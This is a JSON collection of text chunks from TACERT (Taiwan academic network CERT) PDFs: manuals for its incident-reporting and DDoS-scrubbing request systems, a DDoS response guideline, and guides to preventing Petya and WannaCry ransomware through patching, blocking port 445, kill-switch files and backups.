        "content": "單列表,如圖14 中1 所示。 B. 中央上方可針對單位、狀態及時間等條件進行搜尋,完成條件輸入 後,點選「顯示」,如圖14 中2 所示。 C. 如需匯出報表,完成條件輸入後,點選「匯出報表」後點選「下載 excel 結果」即可取報表,如圖15 中12所示。 圖 14 圖 15 2 1 1 2  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (6) 事件類型統計(資安攻擊類型趨勢統計系統) STEP 1. 選擇「事件類型統計」開啟資安攻擊類型趨勢統計系統,如圖16。 圖 16 STEP 2. A. 開啟資安攻擊類型趨勢統計系統後,將列出貴單位轄下單位已結案 之事件統計資料,如圖17 中1 所示。且統計出目前貴單位平均審核 統計,以供貴單位參考,如圖17 中2所示。 B. 中央上方可針對單位及時間等條件進行搜尋,完成條件輸入後,點 選「顯示」,如圖17 中3所示。 圖 17 2 1 3  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (7) 轄下單位密碼更動情況 選擇「轄下單位密碼更動情況」開啟轄下單位密碼更新狀況系統,將顯 示出所有轄下單位的連絡人密碼更新狀況,如圖18。 圖18 (8) DDoS 清洗系統(DDoS 清洗服務申請系統) STEP 1. A.選擇「DDoS 清洗系統」開啟DDoS 清洗服務申請系統,如圖19 中 1所示。 B.若要申請DDoS 清洗服務,點選「新增申請單」,如圖19 中2所示。 圖19 STEP 2. 點選「新增申請單」後,系統產生如圖20 所示的表單,平台會自動篩 選出其轄下的連線單位列表供使用者選擇,使用者將相關資訊(*為必填 欄位)填入「送出」即可。 圖20 DDOS 清洗申請單表單內容 STEP 3.檢視DDoS 工單資訊 A.點選「DDOS 清洗系統」功能將顯示所有D",
        "Page_Num": "11,12,13"
    },
    "650": {
        "File_Name": "教育機構資安通報平台報表系統操作手冊V2_10705.pdf",
        "content": "DOS 工單資訊,如圖21 所 示,其中「狀態」說明如下。 1 2  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 狀態:待處理 (二線人員新增DDOS 工單) 處理中(SOC 人員正在處理) 處理完成(已處理完成) 失敗(SOC 處理該工單失敗,無法清洗) 圖 21 檢視DDoS 工單資訊 B.點選「檢視」即可查詢該工單,如圖22 所示,其中「回覆意見」為SOC 對於該DDOS 工單的回覆(例如:無法清洗的原因)。 圖22  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team STEP 4.教育機構資安通報平台自動產行「自行通報」事件單 當SOC 中心完成清洗後,會登入DDoS 清洗系統將工單狀態改為「處理完 成」,此時平台會自動產生一張自行通報事件單(如圖23 所示)至「教育機 構資安通報應變平台」,連線單位需依照「教育機構資安通報應變流程」完 成填寫通報應變->二線區縣市網路中心通報審核->TACERT 團隊通報審核, 此DDoS 攻擊事件單才算完整結案。 圖23 ",
        "Page_Num": "13,14,15"
    },
    "651": {
        "File_Name": "教育機構資安通報平台帳號管理功能說明.pdf",
        "content": "TACERT 臺灣學術網路危機處理中心 教育機構資安通報平台帳號 管理功能說明  1 目錄 現行帳號狀況說明 .................................................................................... 2 連絡人資料顯示 ........................................................................................ 3 操作步驟: ............................................................................................. 3 帳號管理功能............................................................................................. 5 操作步驟: ............................................................................................. 5 資安連絡人異動 ........................................................................................ 9  2 現行帳號狀況說明 帳號管理功能包含「連絡人資料顯示」功能及「帳號管理功能」。  3 連絡人資料顯示 連絡人資料顯示功能附加於修改個人資料中,用來顯示除登入 使用者外其他連絡人資料,以利單位內各連絡人了解其他登錄之連 絡人資料。 操作步驟: 點選「修改個人資料」  4 於修改個人資料中可看到三個區塊,分別為「個人基本資料 區」、「密碼變更區」和「單位其他連絡人資料區」。 個人基本資料區:填寫連絡人基本資料 密碼變更區:變更連絡人密碼 單位其他連絡人資料區:顯示除登入使用者外其他連絡人資料,此 功能僅用來顯示並無修改之功能。  5 帳號管理功能 帳號管理功能用來管理單位內未使用之帳號,透過關閉未使用 之帳號,以降低資訊安全之風險。 此功能由第一、二連絡人負責管理。 操作步驟: 點選「帳號管理」  6 右側顯示出第三~五連絡人帳號狀態 關閉帳號:勾選要關閉之帳號後,點選送出  7 送出後,該帳號狀態會變更為「已關閉」。 開啟帳號:勾選已關閉之帳號後,點選送出  8 送出後,會於下方顯示該連絡人帳號及重新派發密碼 此功能僅限第一、二連絡人使用,如其他連絡人操作,將出現上方 提示訊息  9 資安連絡人異動 各單位連絡人相關注意事項如上所列。 ",
        "Page_Num": "1,2,3,4,5,6,7,8,9,10"
    },
    "652": {
        "File_Name": "教育體系DDoS攻擊清洗系統操作手冊.pdf",
        "content": "教育機構資安回饋平台- DDoS 清洗系統操作手冊 V2 版 TACERT 臺灣學術網路危機處理中心團隊 製 2019/12  1 目錄 一、 前言 .............................................................................................................................. 2 二、 系統說明 ...................................................................................................................... 3 三、 操作說明(二線區縣市網路中心人員) ...................................................................... 4 (1) 系統網址及登入說明 .................................................................................................. 4 (2) 新增DDoS 清洗服務申請 ............................................................................................ 4 (3) 檢視DDoS 工單資訊 .................................................................................................... 5 (4) 自動產生告知通報事件單 .......................................................................................... 6 四、 操作說明(SOC 人員) ................................................................................................... 7 (1) 系統網址及登入說明 .................................................................................................. 7 (2) 新增DDoS 清洗服務申請 ............................................................................................ 7 (3) 管理DDoS 工單 ............................................................................................................ 8  2 一、 前言 現今的網路攻擊日益頻繁,規模更大,且複雜度更勝以往。尤其近年來國 際間發生多起大規模DDoS(Distributed Denial of Service ,分散式阻斷 服務攻擊)攻擊事件,而且攻擊規模更頻頻創新高。有鑑於此,教育部已於 S-ASOC 及N-ASOC 建置TANet 流量清洗中心,當TANet 內部單位遭受DDoS 攻擊時,可透過TANet 流量清洗中心過濾掉攻擊封包,讓系統可迅速回復 正常。TACERT 團隊負責開發「DDoS 清洗系統」以協助二線區縣市網路中心 人員以及SOC 團隊申請DDoS 清洗服務以及管理清洗流程進度使用, 「DDoS 清洗系統」目前僅提供二線區縣市網路中心以及SOC 團隊使用,若 學術單位遭受DDoS 攻擊時,請透過其所屬之區縣市網路中心申請流量清洗 服務。教育體系DDoS 攻擊清洗申請流程表依圖1 所示,當DDoS 攻擊清洗 完成後,平台會自動產生一張告知通報事件單,連線單位需登入資安通報 平台進行填寫通報應變措施,才算完成整個",
        "Page_Num": "1,2,3"
    },
    "653": {
        "File_Name": "教育體系DDoS攻擊清洗系統操作手冊.pdf",
        "content": "DDoS 攻擊清洗申請流程。 圖1 教育體系DDoS 攻擊清洗申請流程  3 二、 系統說明 為方便二線區縣市網路中心人員以及SOC 團隊人員使用,TACERT 團隊將 「DDoS 清洗系統」整合進「教育機構資安通報回饋平台」,使用者只需登 入回饋平台即可使用此服務。 圖2 DDoS 清洗作業系統功能表 功能 功能說明 A1-二線人員DDOS 開單系統 提供權限登入及新增、查詢DDOS 工單功能 A2- SOC 人員 DDOS 開單系統 提供權限登入及新增、查詢DDOS 工單功能 A3- SOC 人員 DDOS 管理系統 提供管理二線人員DDOS 工單功能 表1 DDoS 清洗作業系統功能說明  4 三、 操作說明(二線區縣市網路中心人員) 下列將針對系統及子功能進行操作說明,並佐以畫面以利操作。 (1) 系統網址及登入說明 系統網址:https://portal.cert.tanet.edu.tw 選擇「資安通報報表系統」,如圖3。 圖3 資安通報報表系統界面 於登錄畫面鍵入帳號、密碼及驗證碼,如圖4。 圖4 登錄介面 (2) 新增DDoS 清洗服務申請 登入資安通報報表系統平台後先點選上方工作列「DDOS 清洗系統」, 再點選「新增申請單」。 圖5 資安通報報表系統登錄後的界面  5 產生如圖6 所示的表單,平台會自動篩選出其轄下的連線單位列表供 使用者選擇,使用者將相關資訊(*為必填欄位)填入「送出」即可。 圖6 DDOS 清洗申請單表單內容 (3) 檢視DDoS 工單資訊 點選「DDOS 清洗系統」功能將顯示所有DDOS 工單資訊,其中「狀 態」說明如下 狀態:待處理 (二線人員新增DDOS 工單) 處理中(SOC 人員正在處理) 處理完成並在保護中(已處理完成) 處理完成並已移出保護中(已處理完成) 失敗(SOC 處理",
        "Page_Num": "3,4,5,6"
    },
    "654": {
        "File_Name": "教育體系DDoS攻擊清洗系統操作手冊.pdf",
        "content": "該工單失敗,無法清洗) 圖 7 檢視DDoS 工單資訊  6  點選「檢視」即可查詢該工單,如圖8 所示,其中「回覆意見」為SOC 對於該DDOS 工單的回覆(例如:無法清洗的原因)。 圖8 (4) 自動產生告知通報事件單 當SOC 中心完成清洗後,會登入DDoS 清洗系統將工單狀態改為「處理完 成」,此時平台會自動產生一張告知通報事件單至「教育機構資安通報應變 平台」,連線單位需依照「教育機構資安通報應變流程」完成填寫通報應變 ->二線區縣市網路中心通報審核->TACERT 團隊通報審核,此DDoS 攻擊事 件單才算完整結案。  7 四、 操作說明(SOC 人員) (1) 系統網址及登入說明 系統網址:https://portal.cert.tanet.edu.tw 選擇「教育機構資安通報回饋平台」,如圖9。 圖9 教育機構資安通報回饋平台界面  於登錄畫面鍵入帳號、密碼及驗證碼,如圖10。 圖10 登錄界面 (2) 新增DDoS 清洗服務申請 登入「資安通報回饋系統平台」後先點選上方工作列「DDOS 清洗系 統」,再點選「新建DDOS 工單」。 1.DDOS 清洗系統 2.新建DDOS 工單  8 圖11 教育機構資安通報回饋平台登錄後的界面 產生如圖12 所示的表單,單位名稱可輸入關鍵字,平台會進行模糊比 對,再點選出正確的單位名稱,使用者將相關資訊(*為必填欄位)填入,, 送出即可。 圖12 DDOS 清洗申請單表單內容 (3) 管理DDoS 工單  點選「管理DDOS 工單」可查詢到所有DDoS 工單的狀態。  9 圖 13 管理DDOS 工單的界面 SOC 人員於清洗完成後,可點選「修改」,更改「狀態」以及填寫「回覆 理由」。 圖10 ",
        "Page_Num": "6,7,8,9,10"
    },
    "655": {
        "File_Name": "臺灣學術網路(TANet)分散式阻斷服務(DDoS)通報應變作業指引.pdf",
        "content": "1 臺灣學術網路 (TANet) 分散式阻斷服務 (DDoS) 通報應變作業指引 一、目的 為有效提升臺灣學術網路(TANet)資安防護能量,降低學術網路之使用者 受到分散式阻斷服務攻擊(Distributed Denial of Service, DDoS)之影響,教 育部規劃「臺灣學術網路分散式阻斷服務通報應變作業指引」(以下稱本指 引),以緩解DDoS 攻擊對各單位之影響,提昇臺灣學術網路之可用性與服 務之品質。 二、適用對象 臺灣學術網路轄下各連線單位 (以下稱連線單位)。 三、適用範圍與限制 (一) 適用範圍 當發生DDoS 攻擊時,連線單位可參考本指引,進行資安事件通報,並申請 DDoS 攻擊流量清洗服務或相關技術支援,以為攻擊事件之應變。 (二) 適用限制 本指引所提的流量清洗服務,僅限於經過臺灣學術網路各區域網路中心的 DDoS 攻擊流量;在DDoS 攻擊流量清洗服務啟動後,除過濾異常網路流量 外,可能會影響部份網路之連線。 四、DDoS 事件通報與應變作業程序 (一) 連線單位準備措施 1. 網域名稱系統(Domain Name System, DNS)服務與管理集中化  2 為避免TANet 學術網路受DDoS 攻擊而導致損害,連線單位應將單位 內的DNS 服務向上集中管理,並將單位內的DNS 服務指向TANet DNS,以保障TANet 使用者之權益。 2. 網路拓樸圖清查與更新 為確保DDoS 清洗服務達預期效果,連線單位應事先清查單位內線路 並更新單位內網路拓樸圖,以為DDoS 清洗服務之策略研判依據。網 路拓譜圖應包含以下資訊,並事先提供本部及DDoS 清洗服務單位備 查: (1) 欲保護核心系統伺服器之IP 位址; (2) 核心系統伺服器所提供的網路服務類別(如80/TCP、53/UDP 等); (3) 連線單位對外所有線路,包含臺灣學術網路及商用網路服務供應 商。 (二) 分級",
        "Page_Num": "1,2"
    },
    "656": {
        "File_Name": "臺灣學術網路(TANet)分散式阻斷服務(DDoS)通報應變作業指引.pdf",
        "content": "措施 當連線單位遭受DDoS 攻擊事件時,應依「教育體系DDoS 攻擊清洗申請 流程」(如附錄)進行相關作業;以下說明不同單位的分級措施。 1. 連線單位 (1) 連線單位受到疑似DDoS 攻擊時,應確認該攻擊事件是否影響單 位內重要設施之運作,並通報上級連線單位(區、縣(市)網路中 心)評估是否有DDoS 攻擊流量清洗服務之必要性;倘若評估結 果為必要,並由上級連線單位至「臺灣學術網路危機處理中心 (TACERT)」提出申請。 (2) 連線單位於DDoS 清洗服務結束後,可參考《教育機構資安通報 應變手冊》以及《國家資通安全通報應變作業綱要》,判定DDoS 攻擊事件之事件等級,並依據資安事件等級,於時限內至 TACERT 的「教育機構資安通報平台」填寫《資安通報單》,以完 成通報應變作業。「教育機構資安通報平台」網址為  3 https://info.cert.tanet.edu.tw/。 2. 區、縣(市)網路中心 (1) 當區、縣(市)網路中心或轄下連線單位有必要申請DDoS 清洗服務 時,應由區、縣(市)網路中心至TACERT 之「資安通報報表系 統」項下的「DDoS 通報」提出申請。「資安通報報表系統」網址 為https://portal.cert.tanet.edu.tw/index.html。 (2) 當區、縣(市)網路中心本身受攻擊而申請DDoS 攻擊清洗服務 結束後,亦應比照連線單位作為,判定DDoS 攻擊事件之事件等 級,並依據各資安事件等級之指引,於時限內至教育機構資安通 報平台完成通報應變作業。 (3) 區、縣(市)網路中心協助連線單位申請DDoS 攻擊流量清洗服 務應於服務結束後,由區、縣(市)網路人員登入TACERT 之 「教育機構資安通報平台」就連線單位所填寫的《資安通報單》 內容進行審核,確認資安通報單內容的完整",
        "Page_Num": "2,3"
    },
    "657": {
        "File_Name": "臺灣學術網路(TANet)分散式阻斷服務(DDoS)通報應變作業指引.pdf",
        "content": "性,以及事件等級判 斷的正確性。 (4) 區、縣(市)網路中心的資安人員應掌握DDoS 攻擊事件狀況, 並提供必要之技術支援,協助連線單位進行事件之應變處理。 3. 學術資訊安全維運中心(Academic Security Operation Center, A-SOC) (1) 南區與北區的學術資訊安全維運中心(A-SOC)在偵測到大規模 DDoS 攻擊時,應分析DDoS 攻擊流量以及攻擊手法,並發出資 安警訊通知連線單位。 (2) 南區與北區的A-SOC 應依其服務範圍,於接獲TACERT「DDoS 通報」申請或在教育部緊急通知時,提供DDoS 攻擊流量清洗服 務,並掌握重大DDoS 攻擊事件細節,如攻擊事件之樣態、時 間、來源與目標、攻擊軌跡以及緩解記錄等。必要時,A-SOC 可 聯繫其他電信業者進行協同作業。  4 附錄: ",
        "Page_Num": "3,4"
    },
    "658": {
        "File_Name": "預防Petya勒索病毒攻擊的方法v1.pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 預防Petya 勒索病毒攻擊的方法 一、前言 繼106 年5 月中旬WannaCry 勒索病毒事件後,近日在全球各地陸續爆發新型勒索病毒 Petya,尤其以歐洲最為嚴重,該病毒非之前舊型Petya 病毒,而其攻擊行為比WannaCry 病 毒更勝一籌,駭客除了使用SMBv1 漏動外,也會利用Windows 的遠端指令功能PsExec 或是 WMIC(Windows Management Instrumentation)來執行命令,包括傳染至其他電腦。為避免 感染此病毒,建議使用者盡快做好防範措施。 二、病毒資訊 NO 項目 內容 1 病毒名稱 Petya (又名NotPetya、Petwrap 或稱Petya.2017) 2 微軟編號 MS17-010 3 CVE 編號 CVE-2017-0199 4 病毒特徵 Petya 勒索病毒是經由 Microsoft 官方提供的 PsExec 遠端執行工具 或是WMIC 來進入電腦系統,也會搭配 EternalBlue 這個漏洞攻擊套 件來攻擊SMB v1 漏洞。一旦Petya 進入電腦會利用程式rundll32.exe 來執行其程式碼,其檔案加密程式碼是放在 Windows 資料夾底下一個 名為「perfc.dat 」的檔案內,接著會自動建立排程,設定電腦於1 小時內重新開機來啟動加密機制,也會利用這一小時掃描電腦所在的 區域網路。另外,Petya 鎖定加密的檔案大多是企業常使用的檔案類 型,甚至也會直接攻擊文件系統。特別的是,遭Petya 加密的檔案, 不會變更其副檔名。在電腦重新開機後,會修改受害電腦之作業系統 開機磁區(MBR),並且加密硬碟的檔案配置表(MFT)。 當加密檔案的程序完成後,使用者會看到要求贖金的畫面,要求受害 者支付相當於300 美元(約合新台幣 9,173 元)的比特幣到攻擊者所 提供的單一錢包,取得單一識別碼再寄一封電子郵件到某個 @posteo.net 的信箱告知。付款",
        "Page_Num": "1"
    },
    "659": {
        "File_Name": "預防Petya勒索病毒攻擊的方法v1.pdf",
        "content": "後可透過該信箱與攻擊者通信以換取 解密金鑰,但目前該信箱已被電子郵件服務商停用,這表示受害者已 無法與攻擊者通信要求解密,又由於Petya 病毒對受害者的電腦所建 立的個別安裝ID 碼是隨機產生的,該ID 碼的主要用途是提供駭客辨 認受害者,以便駭客提供解密金鑰給已付贖金的受害者,可是當ID 碼 是隨機產生意謂著不可能再解密檔案,即使受害者付了贖金也救不回 資料。 5 受影響 作業系統 Windows XP Windows Vista  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 項目 內容 Windows 7 Windows 8.1 Windows RT 8.1 Windows 10 Windows Server 2003 Windows Server 2008 Windows Server 2008 R2 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 三、建議措施 1. 設定Windows 密碼與加強密碼強度 為避免攻擊者破解使用者密碼,建議使用者務必設定登入Windows 的密碼,並且加強密碼 強度,建議設定含英文及數字組合之8 位以上的密碼,並定期變更密碼。以Windows7 系 統為例,使用者可至「控制台>使用者帳戶和家庭安全>使用者帳戶>」內變更密碼。 2. 建立預防Petya 的Kill–Switch 檔案 為了預防感染Petya 病毒,使用者可自行於C:\\Windows 目錄下建立病毒加密時會使用的 檔案,來中斷病毒程式的執行。建立檔案的方式以Windows 7 系統為例,說明如下: (1)以系統管理員身分執行「命令提示字元」。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2)輸入以下指令,在C:\\Windows 資料夾中建立perfc、perfc.dll 與perfc.dat 等三個 檔案。 No. 指令內容 說明 1 cd..(按Enter) 至C:\\Windows 目錄下 2 copy con perfc(按Enter) 複製產生一個空白內容的perfc 檔案 3 (按Ctrl+Z) 中斷 4 (按Enter) 完成複製 5 copy perfc perfc.dll 複製產生一個perfc.dll 檔案 6 copy perfc",
        "Page_Num": "1,2,3"
    },
    "660": {
        "File_Name": "預防Petya勒索病毒攻擊的方法v1.pdf",
        "content": "perfc.dat 複製產生一個perfc.dat 檔案  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 關閉 Windows 系統的 445 連接埠。 為預防Petya 病毒透過445port 滲入,建議使用Windows 系統內新增防火牆輸入規則的方 式,封鎖445 連接埠的連線。以Windows7 系統為例,使用者可至「控制台」>「系統及安 全性」>「Windows 防火牆」>「進階設定」內,新增兩條輸入規則鎖住445 連接埠。 4. 定期使用隨身碟、外接硬碟或者雲端空間備份重要資料。 當電腦感染到Petya 病毒時,尚無任何還原程式可將被加密的檔案解密,因此建議使用者 定期進行資料備份。 5. 使用 Windows Update 自動更新或手動更新微軟的Windows 的 SMBv1 漏洞修補程式(漏 洞編號 MS17-010)與Office 應用程式弱點修補程式(漏洞編號CVE-2017-0199) 可至微軟官方網站下載修補程式進行更新,參考網址如下。 (1)MS17-010: https://technet.microsoft.com/zh-tw/library/security/ms17-010.aspx (2)CVE-2017-0199: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-201 7-0199 6. 確認防毒軟體已更新至最新版本病毒碼與偵測程式碼,並定期執行電腦掃毒作業。 7. 因病毒執行加密時會建立排程,讓系統自動重新開機,建議使用者發現系統無預警自動 重新開機時,應即刻關閉電腦電源,以避免進一步的加密行為。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 參考資料: 1. Petya Ransomware Spreading Rapidly Worldwide, Just Like WannaCry http://thehackernews.com/2017/06/petya-ransomware-attack.html 2. Analyzing the Fileless, Code-injecting SOREBRECT Ransomware https://blog.trendmicro.com/trendlabs-security-intelligence",
        "Page_Num": "3,4,5"
    },
    "661": {
        "File_Name": "預防Petya勒索病毒攻擊的方法v1.pdf",
        "content": "/analyzing-fil eless-code-injecting-sorebrect-ransomware/ 3. Petya 病毒全球爆發中 ! 比 WannaCry 強 電腦更新過也中招 : Windows 香港受害 者上升中 https://unwire.hk/2017/06/28/petya/top-news/ 4. 《勒索病毒警訊!》Petya 大規模爆發中,三步驟防範感染 https://blog.trendmicro.com.tw/?p=50559 ",
        "Page_Num": "5"
    },
    "662": {
        "File_Name": "預防Wanacrypt0r2勒索病毒攻擊的方法(TACERT).pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 預防 Wanacrypt0r 2.0 勒索病毒攻擊的方法 一、前言 近日勒索軟體 WanaCrypt0r 2.0 利用Windows 系統的SMB 漏洞,大規模的攻擊未安裝 修正過後更新檔的Windows 系統,而造成受害者系統上的檔案被加密,被加密的檔案副檔名 都會變更為 .wncry,至目前為止絶大部分的受害者系統以Windows XP、7 與8.1 居多,建議 使用相關系統的使用者,提高警覺並儘速安裝相關更新程式。 二、病毒資訊 NO 項目 內容 1 病毒名稱 WanaCrypt0r 2.0(又名 WannaCry 或Wcry) 2 微軟編號 MS17-010 3 CVE 編號 CVE-2017-0143、CVE-2017-0144、CVE-2017-0145、CVE-2017-0146、 CVE-2017-0148 4 病毒特徵 「WanaCrypt0r 2.0」主要是透過Windows 系統內名為 EternalBlue 的Windows SMB 遠端執行程式碼弱點進行攻擊,而成功 利用弱點的攻擊者則有機會獲得在目標伺服器上執行程式碼的能力。 攻擊者成功攻擊該漏洞之後,可以將檔案送入受害系統,再將此 檔案作為服務執行,接著再將真正的勒索病毒檔案送入受害系統,它 會用.WNCRY 副檔名來對檔案進行加密,同時也會送入另一個用來顯示 勒索通知的檔案;被針對的副檔名包括Microsoft Office、資料庫、 壓縮檔、多媒體檔案和各種程式語言常用的副檔名。 使用者電腦在遭受感染後,因電腦內檔案被加密成副檔名 為.WNCRY 的格式,導致受害者無法正常讀取檔案。檔案被加密後,該 惡意軟體會鎖住電腦網路,並利用使用者的資料進行勒索,彈出紅色 的勒索視窗,指示受害者需在3 天內交付300 美元的比特幣(Bitcoin) 贖金,而後每兩個小時贖金增加100 美元,一路增至600 美元,若未 能在7 天內交付贖金、取得解密金鑰,則受害者將無法恢復",
        "Page_Num": "1"
    },
    "663": {
        "File_Name": "預防Wanacrypt0r2勒索病毒攻擊的方法(TACERT).pdf",
        "content": "電腦內的 已被加密的檔案。 5 受影響 作業系統 Windows XP Windows Vista Windows7 Windows8 Windows8.1 Windows Server 2008 Windows Server 2008 R2  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 項目 內容 Windows Server 2012 Windows Server 2012 R2 Windows RT 8.1 三、建議措施 下面內容為針對Windows 7 與Windows 8.1 作業系統所進行的預防步驟說明,由於微軟 公司已停止支援Window XP 及 Windows Server 2003 系統的自動更新,建議使用此兩個系統 的使用者可以到微軟公司的官方網站直接下載修補程式,並進行手動更新作業。微軟提供之 更新檔案網址: https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannac rypt-attacks/ 。 1.移除網路線或關閉無線網路,確認電腦未連接至網路。 由於Wanacrypt0r 2.0 是透過 SMB 檔案分享的TCP 445 連接埠來傳播,如果使用者 的電腦可以跟辦公室內的其他電腦相連、互傳檔案的話(如:網路芳鄰),就有機會被感染。 2. 關閉Windows 系統的445 通訊埠: 在未更新安全修正程式的情況下,建議使用Windows 系統內新增防火牆輸入規則的方 式,封鎖445 連接埠的連線。下面為在Windows 7 與Windows 8.1 兩個作業系統內如何關 閉445 通訊埠的步驟說明。 (1)Windows 7 關閉445 通訊埠的方式: 至「控制台」>「系統及安全性」>「Windows 防火牆」>「進階設定」內,新增兩條輸 入規則鎖住445 連接埠,設定方式如下: No 說明 圖示 1 在防火牆之輸 入規則設定頁 面,點選視窗右 邊區塊內,輸入 規則之「新增規 則」選項。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No 說明 圖示 2 點選「連接埠」 選項,並按「下 一步」。 3 點選「TCP」選 項,特定本機連 接埠輸入445, 並按「下一 步」。  4",
        "Page_Num": "1,2,3,4"
    },
    "664": {
        "File_Name": "預防Wanacrypt0r2勒索病毒攻擊的方法(TACERT).pdf",
        "content": "臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No 說明 圖示 4 點選「封鎖連 線」,並按「下 一步」。 5 確認所有網路 環境都套用此 規則,並且按 「下一步」。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No 說明 圖示 6 針對規則命 名,建議名稱可 與事件或規則 內容有關,避免 忘記其用途。輸 入規則名稱為 TCP445,並點選 「完成」。 7 完成後在「輸入 規則」內會看到 剛剛新增的規 則TCP445。 8 將TCP 445 的輸 入規則設定完 成後,以同樣方 式新增UDP 445 的規則,兩者作 法的差異之處 如右圖所示,在 規則類型的設 定頁面,選 「UDP」選項, 在規格名稱的 命名頁面輸入 「UDP445」,其 餘作法都相同。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No 說明 圖示 9 設定完成後,會 在「輸入規則」 區塊內看到兩 條新增規則: TCP445 與 UDP445。 (2)Windows 8.1 關閉445 通訊埠的方式:: 至「控制台」>「系統及安全性」>「Windows 防火牆」>「進階設定」內,新增兩條 輸入規則鎖住445 連接埠,設定方式如下: NO 說明 圖示 1 在防火牆「輸入 規則」頁面視窗 之最右區塊 內,點選「新增 規則」選項。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 說明 圖示 2 點選「連接埠」 選項,並按「下 一步」。 3 點選「TCP」選 項,特定本機連 接埠輸入445, 並按「下一 步」。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 說明 圖示 4 點選「封鎖連 線」,並按「下 一步",
        "Page_Num": "4,5,6,7,8"
    },
    "665": {
        "File_Name": "預防Wanacrypt0r2勒索病毒攻擊的方法(TACERT).pdf",
        "content": "」。 5 確認所有網路 環境都套用此 規則,並且按 「下一步」。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 說明 圖示 6 針對規則命 名,建議名稱可 與事件或規則 內容有關,避免 忘記其用途。輸 入規則名稱為 TCP445,並點選 「完成」。 7 完成後在「輸入 規則」內會看到 剛剛新增的規 則TCP445。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 說明 圖示 8 將TCP 445 的輸 入規則設定完 成後,以同樣方 式新增UDP 445 的規則,兩者作 法的差異之處 如右圖所示,在 規則類型的設 定頁面,選 「UDP」選項, 在規格名稱的 命名頁面輸入 「UDP445」,其 餘作法都相同。 9 設定完成後,會 在「輸入規則」 區塊內看到兩 條新增規則: TCP445 與 UDP445。 3.備份電腦內重要資料。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4.重新開啟網路連線,使電腦可連上網際網路。 5. 使用Windows Update 更新或手動更新微軟KB4012215(漏洞編號MS17-010): 為了避免電腦在尚未更新系統時,被其他已中毒的電腦攻擊,故在更新前我們先做 一層防護,將445 通訊埠關閉,在確認攻擊者無法透過此連接埠進入後,我們開始進行 系統更新作業。下面為針對Windows 7 與Windows 8.1 兩個作業系統進行系統更新的詳 細步驟說明。 (1)在Windows 7 內執行Windows update 的更新方式: 在「控制台」>「系統及安全性」頁面內,點選「Windows Update」,進行「檢查更 新」,確認已安裝最新的系統更新檔。 (2)在Windows 8.1 內執行windows update 的更新方式: 在「控制台」>「系統及安全性」頁面內,點選「Windows Update」,進行「檢查更 新」,確認已安裝最新的系統更新檔。  12 臺灣學術網路危機處理中心(",
        "Page_Num": "8,9,10,11,12"
    },
    "666": {
        "File_Name": "預防Wanacrypt0r2勒索病毒攻擊的方法(TACERT).pdf",
        "content": "TACERT) TANet Computer Emergency Response Team (3) 手動更新微軟KB4012215(漏洞編號MS17-010)的方式: 至微軟官方網站下載修補程式進行更新,參考網址如下。 KB4012215: https://support.microsoft.com/zh-tw/help/4012215 MS17-010: https://technet.microsoft.com/zh-tw/library/security/ms17-010.aspx?f=255&MS PPError=-2147217396#ID0EHB 6.更新電腦內之防毒軟體與病毒碼。 為了更有效預防Wanacrypt0r 2.0 勒索病毒的攻擊,建議使用者至微軟官方網站下 載、安裝微軟免費防毒軟體Windows Defender,因為目前Windows Defender 已經可以針 對系統中的惡意程式Wanacrypt0r 2.0 提供偵測並清除。 7.重新開啟445 通訊埠的連線功能: (1)Windows 7 重開445 連接埠的方式: NO 說明 圖示  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 說明 圖示 1 點選「輸入規 則」之 TCP445 規 則,並按滑鼠 右鍵,出現選 項方塊後,點 選「刪除」選 項。 2 出現是否刪 除規則的詢 問視窗後,點 選「是」。 3 完成後,我們 可以發現輸 入規則內已 無TCP445 的 規則,接著以 同樣方式進 行UDP445 規 則的刪除動 作。 (2)Windows 8.1 內重開445 連接埠的方式: NO 說明 圖示  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 說明 圖示 1 點選「輸入規 則」之 TCP445 規 則,並按滑鼠 右鍵,出現選 項方塊後,點 選「刪除」選 項。 2 出現是否刪 除規則的詢 問視窗後,點 選「是」。 3 完成後,我們 可以發現輸 入規則內已 無TCP445 的 規則,接著以 同樣方式進",
        "Page_Num": "12,13,14"
    },
    "667": {
        "File_Name": "預防Wanacrypt0r2勒索病毒攻擊的方法(TACERT).pdf",
        "content": "行UDP445 規 則的刪除動 作。 在執行完成以上步驟後,建議使用者可以至下列網站進行系統漏洞之安全檢查。 線上檢查網站: https://doublepulsar.below0day.com/ 參考資料: 1. https://www.facebook.com/twcertcc/posts/1947829248780144 2. https://www.facebook.com/twcertcc/posts/1947904648772604 3. https://www.facebook.com/MicrosoftTaiwan/posts/1024724287627679:0 4. http://technews.tw/2017/05/13/ransomeware-wanacrypt0r-2/ 5. https://blog.trendmicro.com.tw/?p=49682 ",
        "Page_Num": "14"
    }
}